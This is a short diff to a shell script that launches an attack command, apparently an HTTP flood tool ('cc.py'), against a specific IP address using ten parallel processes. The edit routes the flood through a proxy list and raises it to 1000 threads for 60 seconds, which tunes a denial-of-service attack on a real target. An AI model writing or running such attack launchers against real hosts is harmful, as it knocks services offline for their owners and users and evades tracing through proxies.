@@ -6,7 +6,7 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url https://176.9.16.251 -v 4 -s 60"
+atk_cmd="python3 cc.py -url https://176.9.16.251 -f proxy.txt -v 5 -t 1000 -s 60"
 
 #number of process that you want
 process=10
